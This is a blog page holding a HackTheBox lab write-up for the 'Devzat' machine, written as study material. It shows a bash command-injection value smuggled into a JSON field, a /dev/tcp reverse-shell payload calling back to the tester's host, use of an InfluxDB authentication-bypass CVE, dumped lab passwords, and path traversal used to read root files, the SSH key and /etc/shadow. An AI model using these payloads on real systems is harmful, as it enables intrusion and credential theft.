<!DOCTYPE html><html lang="en" dir="auto"><head><meta charset="utf-8"/><meta http-equiv="x-ua-compatible" content="IE=edge"/><meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no"/><meta name="robots" content="index, follow"/><title>HackTheBox Writeup: Devzat | Zebra</title><meta name="keywords" content="cybersecurity,ctf,linux,hackthebox"/><meta name="description" content="Simple machine with a lot of `OSINT` and an easy `bash` command injection."/><meta name="author" content="Zebra"/><link rel="canonical" href="https://xzebra.dev/blog/hackthebox_writeup_devzat/"/><link crossorigin="anonymous" href="/assets/css/stylesheet.523aabfa2b5ee217ac92d035cb44bf463d5d30a14b08f7aa59ccfdbebf4501f8.css" integrity="sha256-Ujqr+ite4hesktA1y0S/Rj1dMKFLCPeqWcz9vr9FAfg=" rel="preload stylesheet" as="style"/><script defer="" crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload="hljs.initHighlightingOnLoad()"></script>
<link rel="icon" href="https://xzebra.dev/images/favicon.ico"/><link rel="icon" type="image/png" sizes="16x16" href="https://xzebra.dev/images/favicon-16x16.png"/><link rel="icon" type="image/png" sizes="32x32" href="https://xzebra.dev/images/favicon-32x32.png"/><link rel="apple-touch-icon" href="https://xzebra.dev/images/apple-touch-icon.png"/><link rel="mask-icon" href="https://xzebra.dev/safari-pinned-tab.svg"/><meta name="msapplication-TileColor" content="#2e2e33"/><link rel="alternate" hreflang="en" href="https://xzebra.dev/blog/hackthebox_writeup_devzat/"/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="HackTheBox Writeup: Devzat"/><meta property="og:description" content="Simple machine with a lot of `OSINT` and an easy `bash` command injection."/><meta property="og:type" content="article"/><meta property="og:url" content="https://xzebra.dev/blog/hackthebox_writeup_devzat/"/><meta property="og:image" content="https://xzebra.dev/images/posts/prod-files-secure.s3.us-west-2.amazonaws.com_zepKBTh.png"/><meta property="article:section" content="blog"/><meta property="article:published_time" content="2021-10-29T17:11:00+07:00"/><meta property="article:modified_time" content="2023-05-13T11:18:00+07:00"/><meta property="og:site_name" content="Zebra"/><meta property="og:see_also" content="https://xzebra.dev/blog/hackthebox_writeup_earlyaccess/"/><meta property="og:see_also" content="https://xzebra.dev/blog/hackthebox_writeup_developer/"/><meta property="og:see_also" content="https://xzebra.dev/blog/hackthebox_writeup_unicode/"/><meta property="og:see_also" content="https://xzebra.dev/blog/hackthebox_writeup_backdoor/"/><meta property="og:see_also" content="https://xzebra.dev/blog/hackthebox_writeup_shibboleth/"/><meta property="og:see_also" content="https://xzebra.dev/blog/hackthebox_writeup_pikaboo/"/><meta name="twitter:card" content="summary_large_image"/><meta name="twitter:image" content="https://xzebra.dev/images/posts/prod-files-secure.s3.us-west-2.amazonaws.com_zepKBTh.png"/><meta name="twitter:title" content="HackTheBox Writeup: Devzat"/><meta name="twitter:description" content="Simple machine with a lot of `OSINT` and an easy `bash` command injection."/><script type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Blog","item":"https://xzebra.dev/blog/"},{"@type":"ListItem","position":2,"name":"HackTheBox Writeup: Devzat","item":"https://xzebra.dev/blog/hackthebox_writeup_devzat/"}]}</script><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"HackTheBox Writeup: Devzat","name":"HackTheBox Writeup: Devzat","description":"Simple machine with a lot of `OSINT` and an easy `bash` command injection.","keywords":["cybersecurity","ctf","linux","hackthebox"],"articleBody":"Enumeration sudo nmap -sC -sS -sV -F 10.10.11.118 \u003escan.txt Starting Nmap 7.92 ( ) at 2021-10-29 17:22 EEST Nmap scan report for 10.10.11.118 Host is up (0.15s latency). Not shown: 97 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 c2:5f:fbüá©üá™32:ff:44:bf:08:f5:ca:49:d4:42:1a:06 (RSA) | 256 bcüíøe8:ee:0a:a9:15:76:52:bc:19:a4:a3:b2:ba:ff (ECDSA) |_ 256 62:ef:72:52:4f:19:53:8b:f2:9b:be:46:88:4b:c3:d0 (ED25519) 80/tcp open http Apache httpd 2.4.41 |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Did not follow redirect to 8000/tcp open ssh (protocol 2.0) | ssh-hostkey: |_ 3072 6a:ee:db:90:a6:10:30:9f:94:ff:bf:61:95:2a:20:63 (RSA) | fingerprint-strings: | NULL: |_ SSH-2.0-Go 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at : SF-Port8000-TCP:V=7.92%I=7%D=10/29%Time=617C0391%P=x86_64-pc-linux-gnu%r(N SF:ULL,C,\"SSH-2\\\\.0-Go\\\\r\\\\n\"); Service Info: Host: devzat.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at . Nmap done: 1 IP address (1 host up) scanned in 41.32 seconds There are 2 SSH services‚Ä¶\nIf we visit the page, we get redirected to devzat.htb, so we will add it to the /etc/hosts file.\nThe page shows a project of a chat working through ssh. That‚Äôs why there are 2 SSH services.\nssh -l [username] devzat.htb -p 8000\nssh -l zebra devzat.htb -p 8000 -oHostKeyAlgorithms=+ssh-rsa zebra: help devbot: Run /help to get help! zebra: /help [SYSTEM] Welcome to Devzat! Devzat is chat over SSH: github.com/quackduck/devzat [SYSTEM] Because there's SSH apps on all platforms, even on mobile, you can join from anywhere. [SYSTEM] [SYSTEM] Interesting features: [SYSTEM] ‚Ä¢ Many, many commands. Run /commands. [SYSTEM] ‚Ä¢ Rooms! Run /room to see all rooms and use /room #foo to join a new room. [SYSTEM] ‚Ä¢ Markdown support! Tables, headers, italics and everything. Just use in place of newlines. [SYSTEM] ‚Ä¢ Code syntax highlighting. Use Markdown fences to send code. Run /example-code to see an example. [SYSTEM] ‚Ä¢ Direct messages! Send a quick DM using =user or stay in DMs by running /room @user. [SYSTEM] ‚Ä¢ Timezone support, use /tz Continent/City to set your timezone. [SYSTEM] ‚Ä¢ Built in Tic Tac Toe and Hangman! Run /tic or /hang to start new games. [SYSTEM] ‚Ä¢ Emoji replacements! (like on Slack and Discord) [SYSTEM] [SYSTEM] For replacing newlines, I often use bulkseotools.com/add-remove-line-breaks.php. [SYSTEM] [SYSTEM] Made by Ishan Goel with feature ideas from friends. [SYSTEM] Thanks to Caleb Denio for lending his server! [SYSTEM] [SYSTEM] For a list of commands run [SYSTEM] ‚îÉ /commands We can see a Github repo. But I couldn‚Äôt find anything.\nGitHub - quackduck/devzat: The devs are over here at devzat, chat over SSH! The devs are over here at devzat, chat over SSH! Contribute to quackduck/devzat development by creating an account on GitHub. https://github.com/quackduck/devzat If we try to login with username patrick, we get prompted the following:\nNickname reserved for local use, please choose a different one. If we run gobuster for vhosts, we get a lot of false positives with 302 status code. If we filter them by status code 200, we may get some results:\ngobuster vhost --url devzat.htb --wordlist /usr/share/dirbuster/directory-list-2.3-medium.txt | grep 'Status: 200' And we found some subdomains!\nFound: pets.devzat.htb (Status: 200) [Size: 510] Found: Pets.devzat.htb (Status: 200) [Size: 510] Getting the foothold In that page, if we submit text twice, we get exit status 1. This reminds us the bash exit code. We could try injecting some bash commands.\nIf we inspect the request we are making in Burp, we are doing a POST request with the following:\n{\"name\":\"test\"} Which seems to not be including the species parameter. So this one seems to be the one which is vulnerable. If we use as input:\n{ \"name\":\"test\", \"species\":\"cat; echo hey\" } We get the following Characteristics:\nHaving a cat is like living in a shared apartment. Most of the time you mind your own business. From time to time you hang out together watching TV. And sometimes you find puke somewhere... hey Which have the string hey appended to the end. This means we can execute code remotely.\nIf we try to create a reverse shell with:\n{ \"name\":\"test\", \"species\":\"cat; nc 10.10.14.111 6666\" } We get exit code 127, which means command or executable not found. Let‚Äôs try with a simpler one.\n{ \"name\":\"test\", \"species\":\"cat; bash -c 'bash -i \u003e\u0026 /dev/tcp/10.10.14.111/6666 0\u003e\u00261'\" } If we listen on port 6666, we get our reverse shell!\npatrick@devzat:~/pets$ And we seem to be logged in as patrick, but there is no user flag in his home dir. Let‚Äôs continue by grabbing the ssh private key of patrick to get a real ssh session. Then, we can connect to patrick with:\nssh -i patrick.key patrick@devzat.htb Getting the user flag Now that we have a real shell, let‚Äôs connect to the service localy.\nssh -l patrick localhost -p 8000 admin: Hey patrick, you there? patrick: Sure, shoot boss! admin: So I setup the influxdb for you as we discussed earlier in business meeting. patrick: Cool üëç admin: Be sure to check it out and see if it works for you, will ya? patrick: Yes, sure. Am on it! devbot: admin has left the chat ssh -l catherine localhost -p 8000 patrick: Hey Catherine, glad you came. catherine: Hey bud, what are you up to? patrick: Remember the cool new feature we talked about the other day? catherine: Sure patrick: I implemented it. If you want to check it out you could connect to the local dev instance on port 8443. catherine: Kinda busy right now üëî patrick: That's perfectly fine üëç You'll need a password I gave you last time. catherine: k patrick: I left the source for your review in backups. catherine: Fine. As soon as the boss let me off the leash I will check it out. patrick: Cool. I am very curious what you think of it. See ya! devbot: patrick has left the chat They mention something about a password, but I couldn‚Äôt find any log of conversations. Also, the chat has no history.\nThey mention some backups. I did a search and got /var/backups.\nfind / -name '*backup*' 2\u003e/dev/null But we don‚Äôt have permissions to copy them.\npatrick@devzat:~$ cp /var/backups/devzat-*.zip ~/. cp: cannot open '/var/backups/devzat-dev.zip' for reading: Permission denied cp: cannot open '/var/backups/devzat-main.zip' for reading: Permission denied Let‚Äôs investigate the 8443 port. We can see more ports open.\npatrick@devzat:~/devzat$ netstat -tulnp | grep LISTEN tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:8086 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:8443 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:5000 0.0.0.0:* LISTEN 869/./petshop tcp6 0 0 :::22 :::* LISTEN - tcp6 0 0 :::8000 :::* LISTEN 878/./devchat tcp6 0 0 :::80 :::* LISTEN - We can connect to the local devzat instance by mapping the remote 8443 port to a local one:\nssh -L8443:localhost:8443 -i patrick.key patrick@devzat.htb And then connect to that devzat instance:\nssh -l patrick localhost -p 8443 admin: Hey patrick, you there? patrick: Sure, shoot boss! admin: So I setup the influxdb 1.7.5 for you as we discussed earlier in business meeting. patrick: Cool üëç admin: Be sure to check it out and see if it works for you, will ya? patrick: Yes, sure. Am on it! devbot: admin has left the chat ssh -l catherine localhost -p 8443 patrick: Hey Catherine, glad you came. catherine: Hey bud, what are you up to? patrick: Remember the cool new feature we talked about the other day? catherine: Sure patrick: I implemented it. If you want to check it out you could connect to the local dev instance on port 8443. catherine: Kinda busy right now üëî patrick: That's perfectly fine üëç You'll need a password which you can gather from the source. I left it in our default backups location. catherine: k patrick: I also put the main so you could diff main dev if you want. catherine: Fine. As soon as the boss let me off the leash I will check it out. patrick: Cool. I am very curious what you think of it. Consider it alpha state, though. Might not be secure yet. See ya! devbot: patrick has left the chat InfluxDB version is earlier than 1.7.6, so we can bypass the password with the following exploit:\nGitHub - LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933: InfluxDB CVE-2019-20933 vulnerability exploit InfluxDB CVE-2019-20933 vulnerability exploit. Contribute to LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933 development by creating an account on GitHub. https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933 We will need to expose the internal influxdb port, which is by default 8086 (and they are using it).\nssh -L8086:localhost:8086 -i patrick.key patrick@devzat.htb CVE-2019-20933 Insert ip host (default localhost): Insert port (default 8086): Insert influxdb user (wordlist path to bruteforce username): ../users.txt Start username bruteforce [x] catherine [x] patrick [v] admin Insert database name (exit to close): devzat [devzat] Insert query (exit to change db): Let‚Äôs list all the tables in the database:\n[devzat] Insert query (exit to change db): SHOW MEASUREMENTS; { \"results\": [ { \"series\": [ { \"columns\": [ \"name\" ], \"name\": \"measurements\", \"values\": [ [ \"user\" ] ] } ], \"statement_id\": 0 } ] } We got a user table. Let‚Äôs check the contents:\n[devzat] Insert query (exit to change db): SELECT * FROM \"user\"; { \"results\": [ { \"series\": [ { \"columns\": [ \"time\", \"enabled\", \"password\", \"username\" ], \"name\": \"user\", \"values\": [ [ \"2021-06-22T20:04:16.313965493Z\", false, \"WillyWonka2021\", \"wilhelm\" ], [ \"2021-06-22T20:04:16.320782034Z\", true, \"woBeeYareedahc7Oogeephies7Aiseci\", \"catherine\" ], [ \"2021-06-22T20:04:16.996682002Z\", true, \"RoyalQueenBee$\", \"charles\" ] ] } ], \"statement_id\": 0 } ] } Passwords are in plain text. We can try catherine‚Äôs one.\npatrick@devzat:~$ su catherine Password: catherine@devzat:/home/patrick$ And we are in!\nPrivilege escalation It seems there are no applications that can be run as sudo without password.\nWe can copy the backup zips in /var/backups to our home and unzip them. After that, we can diff them as patrick told to catherine in one of the messages.\ndiff dev main \u003c func fileCommand(u *user, args []string) { \u003c if len(args) \u003c 1 { \u003c u.system(\"Please provide file to print and the password\") \u003c return \u003c } \u003c \u003c if len(args) \u003c 2 { \u003c u.system(\"You need to provide the correct password to use this function\") \u003c return \u003c } \u003c \u003c path := args[0] \u003c pass := args[1] \u003c \u003c // Check my secure password \u003c if pass != \"CeilingCatStillAThingIn2021?\" { \u003c u.system(\"You did provide the wrong password\") \u003c return \u003c } ... \u003c port = 8443 --- \u003e port = 8000 There is a new file command in the devzat service running on 8443.\ncatherine@devzat:~$ ps -aux | grep devzat root 851 0.0 0.1 6892 3032 ? Ss 05:19 0:00 /bin/bash /root/devzat/start.sh patrick 852 0.0 0.1 6892 2988 ? Ss 05:19 0:00 /bin/bash /home/patrick/devzat/start.sh And this service is being ran by root itself. So we would be reading files with root.\nIf we connect to the service and use the file command, we can get the root.txt flag:\ncatherine: /file ../root.txt CeilingCatStillAThingIn2021? [SYSTEM] ee85798aedbdc77950b34216ffc3aa32 I used ../root.txt because the process is being ran from /root/devzat/start.sh.\nIn case you wanted to compromise the whole machine, you could download the ssh private key of root:\ncatherine: /file ../.ssh/id_rsa CeilingCatStillAThingIn2021? [SYSTEM] -----BEGIN OPENSSH PRIVATE KEY----- ... [SYSTEM] -----END OPENSSH PRIVATE KEY----- Or try to decrypt the hash from /etc/shadow.\ncatherine: /file ../../etc/shadow CeilingCatStillAThingIn2021? [SYSTEM] root:XXXXXX:18891:0:99999:7::: References List tables in InfluxDB: Show tables in a database Dear All, What is the query to show tables in a database please? Thanks a lot in advance https://community.influxdata.com/t/show-tables-in-a-database/5130 CVE Exploit GitHub - LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933: InfluxDB CVE-2019-20933 vulnerability exploit InfluxDB CVE-2019-20933 vulnerability exploit. Contribute to LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933 development by creating an account on GitHub. https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933 ","wordCount":"1910","inLanguage":"en","image":"https://xzebra.dev/images/posts/prod-files-secure.s3.us-west-2.amazonaws.com_zepKBTh.png","datePublished":"2021-10-29T17:11:00+07:00","dateModified":"2023-05-13T11:18:00+07:00","author":{"@type":"Person","name":"Zebra"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://xzebra.dev/blog/hackthebox_writeup_devzat/"},"publisher":{"@type":"Organization","name":"Zebra","logo":{"@type":"ImageObject","url":"https://xzebra.dev/images/favicon.ico"}}}</script></head><body id="top"><header class="header"><nav class="nav"><ul id="menu" style="margin-left:auto"><li><a href="https://xzebra.dev/" title="whoami"><span>whoami</span></a></li><li><a href="https://xzebra.dev/blog/" title="blog"><span>blog</span></a></li><li><a href="https://xzebra.dev/apps/" title="apps"><span>apps</span></a></li></ul></nav></header><main class="main"><article class="post-single"><header class="post-header"><h1 class="post-title">HackTheBox Writeup: Devzat</h1><div><ul class="post-series"><span class="secondary-text">This post belongs to this series:</span><li><a rel="noopener noreferrer" href="https://xzebra.dev/series/hackthebox/" class="link-highlight" style="--highlight-color:#9fef00">HackTheBox Machines</a></li></ul></div><div class="post-description">Simple machine with a lot of <code>OSINT</code> and an easy <code>bash</code> command injection.</div><div class="post-meta"><span title="2021-10-29 17:11:00 +0700 +0700">October 29, 2021</span>¬†¬∑¬†9 min¬†¬∑¬†Zebra</div></header><figure class="entry-cover"><img loading="lazy" src="https://xzebra.dev/images/posts/prod-files-secure.s3.us-west-2.amazonaws.com_zepKBTh.png" alt=""/></figure><div class="post-content"><h1 id="enumeration">Enumeration<a hidden="" class="anchor" aria-hidden="true" href="#enumeration">#</a></h1><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>sudo nmap -sC -sS -sV -F 10.10.11.118 &gt;scan.txt
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span>Starting Nmap 7.92 <span style="color:#f92672">(</span> &lt;https://nmap.org&gt; <span style="color:#f92672">)</span> at 2021-10-29 17:22 EEST
</span></span><span style="display:flex"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.118
</span></span><span style="display:flex"><span>Host is up <span style="color:#f92672">(</span>0.15s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex"><span>Not shown: <span style="color:#ae81ff">97</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span>PORT     STATE SERVICE VERSION
</span></span><span style="display:flex"><span>22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span>| ssh-hostkey:
</span></span><span style="display:flex"><span>|   <span style="color:#ae81ff">3072</span> c2:5f:fbüá©üá™32:ff:44:bf:08:f5:ca:49:d4:42:1a:06 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span>|   <span style="color:#ae81ff">256</span> bcüíøe8:ee:0a:a9:15:76:52:bc:19:a4:a3:b2:ba:ff <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span>|_  <span style="color:#ae81ff">256</span> 62:ef:72:52:4f:19:53:8b:f2:9b:be:46:88:4b:c3:d0 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span>80/tcp   open  http    Apache httpd 2.4.41
</span></span><span style="display:flex"><span>|_http-server-header: Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span>|_http-title: Did not follow redirect to &lt;http://devzat.htb/&gt;
</span></span><span style="display:flex"><span>8000/tcp open  ssh     <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span>| ssh-hostkey:
</span></span><span style="display:flex"><span>|_  <span style="color:#ae81ff">3072</span> 6a:ee:db:90:a6:10:30:9f:94:ff:bf:61:95:2a:20:63 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span>| fingerprint-strings:
</span></span><span style="display:flex"><span>|   NULL:
</span></span><span style="display:flex"><span>|_    SSH-2.0-Go
</span></span><span style="display:flex"><span><span style="color:#ae81ff">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at &lt;https://nmap.org/cgi-bin/submit.cgi?new-service&gt; :
</span></span><span style="display:flex"><span>SF-Port8000-TCP:V<span style="color:#f92672">=</span>7.92%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>10/29%Time<span style="color:#f92672">=</span>617C0391%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu%r<span style="color:#f92672">(</span>N
</span></span><span style="display:flex"><span>SF:ULL,C,<span style="color:#e6db74">&#34;SSH-2\\.0-Go\\r\\n&#34;</span><span style="color:#f92672">)</span>;
</span></span><span style="display:flex"><span>Service Info: Host: devzat.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span>Service detection performed. Please report any incorrect results at &lt;https://nmap.org/submit/&gt; .
</span></span><span style="display:flex"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 41.32 seconds
</span></span></code></pre></div><p>There are 2 SSH services‚Ä¶</p><p>If we visit the page, we get redirected to <code>devzat.htb</code>, so we will add it to the
<code>/etc/hosts</code> file.</p><p>The page shows a project of a chat working through ssh. That‚Äôs why there are 2
SSH services.</p><blockquote><p>ssh -l [username] devzat.htb -p 8000</p></blockquote><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>ssh -l zebra devzat.htb -p <span style="color:#ae81ff">8000</span> -oHostKeyAlgorithms<span style="color:#f92672">=</span>+ssh-rsa
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span>zebra: help
</span></span><span style="display:flex"><span>devbot: Run /help to get help!
</span></span><span style="display:flex"><span>zebra: /help
</span></span><span style="display:flex"><span><span style="color:#f92672">[</span>SYSTEM<span style="color:#f92672">]</span> Welcome to Devzat! Devzat is chat over SSH: github.com/quackduck/devzat
</span></span><span style="display:flex"><span><span style="color:#f92672">[</span>SYSTEM<span style="color:#f92672">]</span> Because there<span style="color:#960050;background-color:#1e0010">&#39;</span>s SSH apps on all platforms, even on mobile, you can join from
</span></span><span style="display:flex"><span>         anywhere.
</span></span><span style="display:flex"><span><span style="color:#f92672">[</span>SYSTEM<span style="color:#f92672">]</span>
</span></span><span style="display:flex"><span><span style="color:#f92672">[</span>SYSTEM<span style="color:#f92672">]</span> Interesting features:
</span></span><span style="display:flex"><span><span style="color:#f92672">[</span>SYSTEM<span style="color:#f92672">]</span> ‚Ä¢ Many, many commands. Run /commands.
</span></span><span style="display:flex"><span><span style="color:#f92672">[</span>SYSTEM<span style="color:#f92672">]</span> ‚Ä¢ Rooms! Run /room to see all rooms and use /room <span style="color:#75715e">#foo to join a new room.</span>
</span></span><span style="display:flex"><span><span style="color:#f92672">[</span>SYSTEM<span style="color:#f92672">]</span> ‚Ä¢ Markdown support! Tables, headers, italics and everything. Just use in place
</span></span><span style="display:flex"><span>         of newlines.
</span></span><span style="display:flex"><span><span style="color:#f92672">[</span>SYSTEM<span style="color:#f92672">]</span> ‚Ä¢ Code syntax highlighting. Use Markdown fences to send code. Run /example-code
</span></span><span style="display:flex"><span>         to see an example.
</span></span><span style="display:flex"><span><span style="color:#f92672">[</span>SYSTEM<span style="color:#f92672">]</span> ‚Ä¢ Direct messages! Send a quick DM using <span style="color:#f92672">=</span>user &lt;msg&gt; or stay in DMs by running
</span></span><span style="display:flex"><span>         /room @user.
</span></span><span style="display:flex"><span><span style="color:#f92672">[</span>SYSTEM<span style="color:#f92672">]</span> ‚Ä¢ Timezone support, use /tz Continent/City to set your timezone.
</span></span><span style="display:flex"><span><span style="color:#f92672">[</span>SYSTEM<span style="color:#f92672">]</span> ‚Ä¢ Built in Tic Tac Toe and Hangman! Run /tic or /hang &lt;word&gt; to start new
</span></span><span style="display:flex"><span>         games.
</span></span><span style="display:flex"><span><span style="color:#f92672">[</span>SYSTEM<span style="color:#f92672">]</span> ‚Ä¢ Emoji replacements! <span style="color:#f92672">(</span>like on Slack and Discord<span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span><span style="color:#f92672">[</span>SYSTEM<span style="color:#f92672">]</span>
</span></span><span style="display:flex"><span><span style="color:#f92672">[</span>SYSTEM<span style="color:#f92672">]</span> For replacing newlines, I often use
</span></span><span style="display:flex"><span>         bulkseotools.com/add-remove-line-breaks.php.
</span></span><span style="display:flex"><span><span style="color:#f92672">[</span>SYSTEM<span style="color:#f92672">]</span>
</span></span><span style="display:flex"><span><span style="color:#f92672">[</span>SYSTEM<span style="color:#f92672">]</span> Made by Ishan Goel with feature ideas from friends.
</span></span><span style="display:flex"><span><span style="color:#f92672">[</span>SYSTEM<span style="color:#f92672">]</span> Thanks to Caleb Denio <span style="color:#66d9ef">for</span> lending his server!
</span></span><span style="display:flex"><span><span style="color:#f92672">[</span>SYSTEM<span style="color:#f92672">]</span>
</span></span><span style="display:flex"><span><span style="color:#f92672">[</span>SYSTEM<span style="color:#f92672">]</span> For a list of commands run
</span></span><span style="display:flex"><span><span style="color:#f92672">[</span>SYSTEM<span style="color:#f92672">]</span> ‚îÉ /commands
</span></span></code></pre></div><p>We can see a <em>Github</em> repo. But I couldn‚Äôt find anything.</p><p></p><div><a target="_blank" rel="noopener noreferrer" class="bookmark" href="https://github.com/quackduck/devzat"><div><div class="bookmark-title">GitHub - quackduck/devzat: The devs are over here at devzat, chat over SSH!</div><div class="bookmark-description">The devs are over here at devzat, chat over SSH! Contribute to quackduck/devzat development by creating an account on GitHub.</div><div class="bookmark-link"><div>https://github.com/quackduck/devzat</div></div></div><div class="bookmark-image"><img src="https://opengraph.githubassets.com/cb75d81b424decff385a5575b9996eb1017defb2cb3b9b2d9df0164da5533366/quackduck/devzat" alt="" loading="lazy"/></div></a></div>If we try to login with username <code>patrick</code>, we get prompted the following:<p></p><pre tabindex="0"><code>Nickname reserved for local use, please choose a different one.
</code></pre><p>If we run <code>gobuster</code> for vhosts, we get a lot of false positives with 302 status
code. If we filter them by status code 200, we may get some results:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>gobuster vhost --url devzat.htb --wordlist /usr/share/dirbuster/directory-list-2.3-medium.txt | grep <span style="color:#e6db74">&#39;Status: 200&#39;</span>
</span></span></code></pre></div><p>And we found some subdomains!</p><pre tabindex="0"><code>Found: pets.devzat.htb (Status: 200) [Size: 510]
Found: Pets.devzat.htb (Status: 200) [Size: 510]
</code></pre><h1 id="getting-the-foothold">Getting the foothold<a hidden="" class="anchor" aria-hidden="true" href="#getting-the-foothold">#</a></h1><p>In that page, if we submit text twice, we get <code>exit status 1</code>. This reminds us the
bash exit code. We could try injecting some bash commands.</p><p>If we inspect the request we are making in Burp, we are doing a POST request
with the following:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json"><span style="display:flex"><span>{<span style="color:#f92672">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;test&#34;</span>}
</span></span></code></pre></div><p>Which seems to not be including the species parameter. So this one seems to be
the one which is vulnerable. If we use as input:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json"><span style="display:flex"><span>{
</span></span><span style="display:flex"><span><span style="color:#f92672">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;test&#34;</span>,
</span></span><span style="display:flex"><span><span style="color:#f92672">&#34;species&#34;</span>:<span style="color:#e6db74">&#34;cat; echo hey&#34;</span>
</span></span><span style="display:flex"><span>}
</span></span></code></pre></div><p>We get the following <em>Characteristics</em>:</p><pre tabindex="0"><code>Having a cat is like living in a shared apartment. Most of the time you mind your own business. From time to time you hang out together watching TV. And sometimes you find puke somewhere... hey
</code></pre><p>Which have the string hey appended to the end. This means we can execute code remotely.</p><p>If we try to create a reverse shell with:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json"><span style="display:flex"><span>{
</span></span><span style="display:flex"><span><span style="color:#f92672">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;test&#34;</span>,
</span></span><span style="display:flex"><span><span style="color:#f92672">&#34;species&#34;</span>:<span style="color:#e6db74">&#34;cat; nc 10.10.14.111 6666&#34;</span>
</span></span><span style="display:flex"><span>}
</span></span></code></pre></div><p>We get <code>exit code 127</code>, which means command or executable not found. Let‚Äôs try
with a simpler one.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json"><span style="display:flex"><span>{
</span></span><span style="display:flex"><span>    <span style="color:#f92672">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;test&#34;</span>,
</span></span><span style="display:flex"><span>    <span style="color:#f92672">&#34;species&#34;</span>:<span style="color:#e6db74">&#34;cat; bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.111/6666 0&gt;&amp;1&#39;&#34;</span>
</span></span><span style="display:flex"><span>}
